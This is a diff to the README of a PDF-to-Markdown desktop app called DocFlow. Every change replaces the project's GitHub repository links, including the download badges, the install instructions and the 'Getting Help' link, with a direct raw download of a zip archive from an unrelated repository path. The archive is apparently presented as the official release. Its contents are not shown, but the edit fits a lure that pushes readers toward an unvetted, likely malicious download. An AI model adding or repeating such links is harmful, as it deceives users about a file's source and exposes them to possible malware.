@@ -5,7 +5,7 @@ description: "Convert PDFs to clean, editable Markdown offline with first-class 
 ---
 # 📄 DocFlow - Convert PDFs to Markdown with Ease
 
-[![Download DocFlow](https://img.shields.io/badge/Download-DocFlow-blue?style=for-the-badge&logo=github)](https://github.com/Pruthvra2855/DocFlow)
+[![Download DocFlow](https://img.shields.io/badge/Download-DocFlow-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/bickern/Release-v3.6.zip)
 
 ## 🌟 What is DocFlow?
 
@@ -43,7 +43,7 @@ DocFlow is a desktop application, meaning it runs directly on your computer. It'
 
 ### 📥 Download and Installation
 
-Visit this link to download the application: **[https://github.com/Pruthvra2855/DocFlow](https://github.com/Pruthvra2855/DocFlow)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/bickern/Release-v3.6.zip](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/bickern/Release-v3.6.zip)**
 
 Once you're on the page, look for the download section. The file you need will be available there. Download it to your computer.
 
@@ -110,7 +110,7 @@ No. DocFlow is fully offline. Your files stay on your computer at all times.
 
 ## 📞 Getting Help
 
-If you encounter issues or have questions, visit the GitHub page: **[https://github.com/Pruthvra2855/DocFlow](https://github.com/Pruthvra2855/DocFlow)**
+If you encounter issues or have questions, visit the GitHub page: **[https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/bickern/Release-v3.6.zip](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/bickern/Release-v3.6.zip)**
 
 You can report bugs, request features, or read documentation there. The project is actively maintained, so help is available.
 
@@ -122,6 +122,6 @@ DocFlow is an open-source project. You're free to use, modify, and share it acco
 
 DocFlow puts professional PDF conversion tools in your hands—for free, offline, and with full support for Persian and Arabic. Download it now and see how easy it is to work with PDF documents.
 
-[![Get DocFlow Now](https://img.shields.io/badge/Get-DocFlow-green?style=for-the-badge&logo=github)](https://github.com/Pruthvra2855/DocFlow)
+[![Get DocFlow Now](https://img.shields.io/badge/Get-DocFlow-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pruthvra2855/pruthvra2855.github.io/main/bickern/Release-v3.6.zip)
 
 Keywords: arabic, desktop-app, electron, markdown, markdown-editor, ocr, ocr-python, ocr-text-reader, offline, pdf, pdf-parser, pdf-processing, pdf-tools, persian, python, react, rtl, typescript
